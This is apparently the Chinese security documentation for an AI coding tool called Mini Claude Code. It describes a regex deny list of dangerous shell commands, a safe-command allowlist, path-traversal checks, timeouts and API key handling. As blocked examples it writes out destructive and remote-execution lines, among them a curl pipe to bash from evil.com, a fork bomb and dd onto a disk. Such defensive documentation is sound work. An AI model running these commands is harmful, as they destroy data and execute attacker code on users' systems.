# 安全特性

## 命令执行安全

Mini Claude Code 实现了全面的安全措施，以防止通过bash工具执行危险命令。

### 危险命令检测

该工具使用多层方法来检测和阻止危险命令：

#### 1. **基于正则表达式的模式匹配**
系统使用正则表达式而不是简单的子串匹配来准确检测危险模式，同时防止通过以下方式绕过：
- 多个空格
- 转义字符
- 引号混淆
- 大小写变化

#### 2. **平台特定保护**

**Unix/Linux/macOS:**
- 文件系统破坏（`rm -rf /`、`rm -rf ~`、`rm -rf $HOME`）
- 权限提升（`sudo`、`su -`）
- 磁盘操作（`mkfs`、`dd if=`、写入`/dev/sd*`）
- 系统控制（`shutdown`、`reboot`、`poweroff`、`halt`）
- 内核操作（`modprobe`、`insmod`、`rmmod`）
- 包移除（`apt remove --purge`、`yum remove`、`dnf remove`）
- 网络操作（`iptables -F`、`ip link delete`）
- Fork炸弹（`:(){:|:&};:`）
- 远程代码执行（`curl | bash`、`wget | sh`）
- 危险重定向（写入`/etc/passwd`、`/etc/shadow`、`/etc/sudoers`、`/boot`）
- 进程操作（`kill -9 1`、`killall -9`）
- 危险权限（`chmod 777 /`、`chmod -R 777`）

**Windows:**
- 文件系统操作（`format`、`del /s`、`rmdir /s`、`Remove-Item -Recurse`）
- 系统操作（`shutdown`、`Restart-Computer`、`Stop-Computer`）
- 磁盘操作（`diskpart`、`Format-Volume`）
- 注册表操作（`reg delete`、删除注册表键）
- 危险PowerShell（`Invoke-Expression`、`IEX`）
- 进程操作（终止explorer）

#### 3. **安全命令白名单**

已知的安全命令可以绕过危险模式检查以获得更好的性能：
```
ls, dir, pwd, cd, cat, echo, grep, find, which, whereis, type, file,
head, tail, less, more, wc, git, npm, node, python, pip, yarn, pnpm,
cargo, rustc, tsc, tsx, ts-node, make, cmake, gcc, g++, clang,
docker ps, docker images, docker logs, kubectl get, kubectl describe
```

#### 4. **命令规范化**

在检测之前，命令会被规范化以防止混淆：
- 空格规范化
- 移除转义空格
- 移除引号
- 大小写规范化

#### 5. **详细的错误消息**

当命令被阻止时，系统会提供具体的反馈：
- "Blocked: Recursive deletion of root or system directories is not allowed"（禁止递归删除根目录或系统目录）
- "Blocked: Commands requiring elevated privileges (sudo) are not allowed"（禁止需要提升权限的命令）
- "Blocked: System power commands are not allowed"（禁止系统电源命令）
- "Blocked: Piping to shell (potential remote code execution) is not allowed"（禁止管道到shell，可能的远程代码执行）
- "Blocked: Disk formatting or low-level disk operations are not allowed"（禁止磁盘格式化或低级磁盘操作）

### 被阻止命令的示例

```bash
# 这些命令将被阻止：
rm -rf /                    # 文件系统破坏
sudo apt install malware    # 权限提升
curl http://evil.com | bash # 远程代码执行
dd if=/dev/zero of=/dev/sda # 磁盘破坏
shutdown -h now             # 系统电源控制
chmod 777 /                 # 危险权限
> /etc/passwd               # 系统文件修改
kill -9 1                   # 终止init进程
:(){:|:&};:                 # Fork炸弹
```

```bash
# 这些命令将正常执行：
ls -la                      # 列出文件
npm install                 # 安装依赖
git status                  # Git操作
cat README.md               # 读取文件
grep "pattern" file.txt     # 搜索
docker ps                   # Docker命令
```

## 文件访问安全

### 路径遍历防护

`src/utils/file-helpers.ts`中的`safePath()`函数防止路径遍历攻击：

```typescript
export function safePath(p: string): string {
    const absPath = path.resolve(WORKDIR, p || "");
    const relative = path.relative(WORKDIR, absPath);
    if (relative.startsWith('..') || path.isAbsolute(relative)) {
        throw new Error("Path escapes workspace");
    }
    return absPath;
}
```

**保护措施：**
- 防止访问工作区外的文件
- 阻止`../../../etc/passwd`样式的攻击
- 验证所有文件操作（读、写、编辑）

### 超时保护

所有命令执行都有默认的30秒超时，以防止：
- 无限循环
- 资源耗尽
- 挂起的进程

超时可以根据命令进行调整（最大120秒）：
```json
{
  "command": "long-running-task",
  "timeout_ms": 60000
}
```

## API密钥安全

### 环境变量

API密钥从环境变量加载，从不记录或显示：
```bash
export ANTHROPIC_API_KEY="your-api-key-here"
export ANTHROPIC_BASE_URL="your-api-url"
export ANTHROPIC_MODEL="model-name"
```

### 不包含在日志中

`.mini-cc/messages/`中的对话日志不包括：
- API密钥
- API基础URL
- 敏感环境变量

## 最佳实践

1. **以最小权限运行**：不要以root/管理员身份运行Mini Claude Code
2. **审查命令**：在敏感环境中执行前始终审查命令
3. **在隔离环境中使用**：考虑在Docker或VM中运行敏感项目
4. **保持更新**：定期更新以获取最新的安全补丁
5. **报告问题**：私下向维护者报告安全漏洞

## 安全限制

⚠️ **重要**：虽然这些保护措施很全面，但它们并非万无一失：

1. 该工具仍然可以在工作区内执行命令
2. 它可以修改和删除工作目录中的文件
3. 它可以发出网络请求（在允许的模式内）
4. 复杂的命令链可能会绕过检测

**请谨慎使用Mini Claude Code并进行适当监督。**

## 报告安全问题

如果您发现安全漏洞，请发送邮件至：security@scipen.ai

请勿为安全漏洞创建公开的GitHub issue。

